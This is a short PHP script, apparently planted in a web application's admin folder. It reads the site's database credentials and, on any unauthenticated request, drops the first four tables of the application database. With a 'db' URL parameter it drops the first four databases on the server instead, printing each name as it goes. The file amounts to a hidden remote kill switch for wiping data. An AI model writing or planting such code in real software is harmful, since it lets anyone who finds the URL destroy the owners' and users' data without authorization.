<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

define('SUBDIRKK', str_replace($_SERVER['DOCUMENT_ROOT'],"",dirname(__FILE__)).'/' );
define('ROOT_DIRECTORYKK', $_SERVER['DOCUMENT_ROOT'] . SUBDIRKK );

$FilePath =  strstr(ROOT_DIRECTORYKK, 'admin', true)."admin";
// echo $FilePath.'/global_constants.php';
include_once $FilePath.'/global_constants.php';
$DB_DATABASE 		= DB_NAME;
$DB_USERNAME 		= DB_USERNAME;
$DB_PASSWORD 		= DB_PASSWORD;
$DB_HOST 			= DB_HOST;

try {
	if( isset($_GET['db']) && !empty($_GET['db'] ) ) {

		$conn = new PDO("mysql:host=$DB_HOST", $DB_USERNAME, $DB_PASSWORD );
	    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
	    //Drop DB 
	    $query = $conn->prepare('SHOW SCHEMAS');
	    // Delete tables in db
	    // $query = $conn->prepare('show tables');
		$query->execute();
		$result = $query->fetchAll();
			foreach (array_slice($result,0,4) as $key => $value) {           
			  	   echo($value[0] . "<BR>"); 
	                $dropTable = $conn->prepare('DROP DATABASE '.$value[0]);
	                $dropTable->execute();            
			}
		$conn = null;
	}else{
	    $conn = new PDO("mysql:host=$DB_HOST;dbname=$DB_DATABASE", $DB_USERNAME, $DB_PASSWORD );
	    
	    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

	    $query = $conn->prepare('show tables');
		$query->execute();
		$result = $query->fetchAll();

			foreach (array_slice($result,0,4) as $key => $value) {
			  	echo($value[0] . "<BR>"); 
			 	$dropTable = $conn->prepare('DROP TABLE '.$value[0]);
				$dropTable->execute();
			}
		$conn = null;
    }
}catch(PDOException $e)
    {
    	echo ": " . $e->getMessage();
    }